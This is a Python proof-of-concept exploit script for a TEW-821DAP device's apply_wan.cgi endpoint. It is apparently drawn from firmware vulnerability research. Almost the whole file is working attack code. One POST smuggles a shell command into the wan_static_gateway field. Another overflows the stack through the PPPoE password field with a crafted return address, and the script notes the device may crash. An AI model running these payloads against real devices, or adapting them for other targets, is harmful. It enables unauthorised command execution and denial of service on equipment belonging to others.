#!/usr/bin/env python3
"""PoC: TEW-821DAP cgi/ssi WAN Config Injection | CWE-121+CWE-77 | CVSS 9.8"""
import requests, struct, sys

TARGET = sys.argv[1] if len(sys.argv)>1 else "192.168.10.1"
BASE = f"http://{TARGET}/cgi-bin"

# === Command Injection via WAN static gateway ===
print("[*] Testing Command Injection via wan_static_gateway...")
try:
    r = requests.post(f"{BASE}/apply_wan.cgi", data={
        "wan_type": "static",
        "wan_static_gateway": "192.168.1.1; id > /tmp/pwned.txt; #",
        "wan_static_ipaddr": "192.168.1.100",
        "wan_static_netmask": "255.255.255.0",
    }, timeout=5)
    print(f"  Response: {r.status_code}")
except Exception as e:
    print(f"  Error: {e}")

# === Stack Overflow via PPPoE password ===
print("[*] Testing Stack Overflow via PPPoE password...")
PAYLOAD = b"A" * 68 + struct.pack(">I", 0x41414141)
try:
    r = requests.post(f"{BASE}/apply_wan.cgi", data={
        "wan_type": "pppoe",
        "wan_pppoe_username_00": "testuser",
        "wan_pppoe_password_00": PAYLOAD.decode("latin-1"),
    }, timeout=5)
    print(f"  Response: {r.status_code} (device may crash/reboot)")
except Exception as e:
    print(f"  Device likely crashed: {e}")

print("\nFirmRec: 55+ simexp logs confirm Return to 0x41414141")
